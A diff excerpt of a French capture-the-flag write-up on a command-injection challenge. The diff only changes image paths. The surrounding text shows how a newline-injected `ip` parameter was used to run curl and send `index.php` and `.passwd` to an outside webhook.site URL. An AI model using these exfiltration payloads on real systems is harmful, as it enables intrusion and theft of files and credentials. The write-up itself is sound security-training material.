@@ -9,22 +9,22 @@
 2. Observation d'une fonctionnalité qui semble permettre de vérifier ou de ping une adresse IP.
 3. Identification d'un paramètre `ip` dans la requête qui est probablement utilisé dans une commande système (comme `ping` ou `host`).
 4. Capture de la requête dans Burp Suite via `Proxy → HTTP history`, puis envoi vers `Repeater` pour pouvoir modifier le paramètre.
-   ![img.png](request.png)
+   ![img.png](/images/challenge8/request.png)
 5. Test d'injection de commande en utilisant le caractère de nouvelle ligne (`%0a` encodé en URL, ou `\n`) pour séparer les commandes et exécuter des commandes supplémentaires.
 6. Création d'une URL sur **webhook.site** pour recevoir les fichiers extraits du serveur.
 7. Injection d'une commande `curl` pour envoyer le contenu du fichier `index.php` vers le webhook :
    ```
    ip=1.1.1.1%0acurl -X POST https://webhook.site/2b3fef87-adad-4a02-8499-377aa6df8972 --data-binary "@index.php"
    ```
-   ![img.png](requestPhpFile.png)
+   ![img.png](/images/challenge8/requestPhpFile.png)
 8. Réception du contenu de `index.php` sur le webhook et analyse du code source pour comprendre la structure de l'application.
-   ![img.png](phpFileReturned.png)
+   ![img.png](/images/challenge8/phpFileReturned.png)
 9. Extraction du fichier `.passwd` qui contient probablement les identifiants ou le flag :
    ```
    ip=1.1.1.1%0acurl -X POST https://webhook.site/2b3fef87-adad-4a02-8499-377aa6df8972 --data-binary "@.passwd"
    ```
 10. Récupération du flag depuis le contenu du fichier `.passwd` reçu sur le webhook.
-    ![img.png](flag.png)
+    ![img.png](/images/challenge8/flag.png)
 11. Validation du challenge.
 
 ### Payloads utilisés
